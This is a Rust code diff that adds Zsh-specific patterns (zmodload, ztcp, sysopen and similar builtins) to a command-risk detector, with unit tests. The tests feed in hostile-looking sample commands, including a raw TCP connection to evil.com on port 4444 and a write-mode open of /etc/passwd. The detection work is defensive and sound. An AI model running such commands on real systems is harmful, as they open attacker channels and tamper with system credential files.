@@ -189,6 +189,31 @@ pub fn analyze_command_risks(command: &str) -> Vec<CommandRisk> {
         push_unique(&mut risks, CommandRisk::RemoteCodeExecution);
     }
 
+    // Zsh-specific dangerous patterns (not covered by tree-sitter-bash)
+    // $=cmd: word-splitting command substitution (zsh-only)
+    if lower.contains("$=") {
+        push_unique(
+            &mut risks,
+            CommandRisk::ZshDangerous("$=cmd word-splitting".into()),
+        );
+    }
+    // zmodload: loads zsh modules that expose raw sockets, file descriptors, etc.
+    if lower.contains("zmodload") {
+        push_unique(
+            &mut risks,
+            CommandRisk::ZshDangerous("zmodload module loading".into()),
+        );
+    }
+    // sysopen/ztcp: zsh builtins for raw FD/socket access
+    for builtin in &["sysopen", "ztcp", "zsocket", "zselect"] {
+        if lower.contains(builtin) {
+            push_unique(
+                &mut risks,
+                CommandRisk::ZshDangerous(format!("{builtin} builtin")),
+            );
+        }
+    }
+
     risks
 }
 
@@ -223,6 +248,8 @@ pub enum CommandRisk {
     CommandSubstitution,
     /// Command uses process substitution `<(cmd)` / `>(cmd)`.
     ProcessSubstitution,
+    /// Command uses Zsh-specific dangerous builtins or patterns.
+    ZshDangerous(String),
 }
 
 impl std::fmt::Display for CommandRisk {
@@ -239,6 +266,7 @@ impl std::fmt::Display for CommandRisk {
             Self::Eval => write!(f, "eval usage"),
             Self::CommandSubstitution => write!(f, "command substitution ($() or backticks)"),
             Self::ProcessSubstitution => write!(f, "process substitution (<(cmd) / >(cmd))"),
+            Self::ZshDangerous(d) => write!(f, "zsh dangerous pattern ({d})"),
         }
     }
 }
@@ -476,5 +504,40 @@ mod tests {
         assert!(stdout.contains("PATH="), "PATH should be in env");
 
         unsafe { std::env::remove_var("TEST_SANDBOX_VAR") };
+    }
+
+    // ── Zsh dangerous patterns ──────────────────────────────────────────
+
+    #[test]
+    fn detect_zsh_dollar_equals() {
+        let risks = analyze_command_risks("echo $=PATH");
+        assert!(risks.iter().any(|r| matches!(r, CommandRisk::ZshDangerous(_))));
+    }
+
+    #[test]
+    fn detect_zmodload() {
+        let risks = analyze_command_risks("zmodload zsh/net/tcp");
+        assert!(risks.iter().any(|r| matches!(r, CommandRisk::ZshDangerous(_))));
+    }
+
+    #[test]
+    fn detect_ztcp() {
+        let risks = analyze_command_risks("ztcp evil.com 4444");
+        assert!(risks.iter().any(|r| matches!(r, CommandRisk::ZshDangerous(_))));
+    }
+
+    #[test]
+    fn detect_sysopen() {
+        let risks = analyze_command_risks("sysopen -w fd /etc/passwd");
+        assert!(risks.iter().any(|r| matches!(r, CommandRisk::ZshDangerous(_))));
+    }
+
+    #[test]
+    fn no_false_positive_zsh_in_string() {
+        // "zmodload" in a comment/string shouldn't trigger if it's in echo
+        let risks = analyze_command_risks("echo 'use zmodload to load modules'");
+        // Note: heuristic scanner WILL detect this (it's substring-based).
+        // AST-based detection would not. The heuristic is conservative (false positives OK).
+        assert!(risks.iter().any(|r| matches!(r, CommandRisk::ZshDangerous(_))));
     }
 }
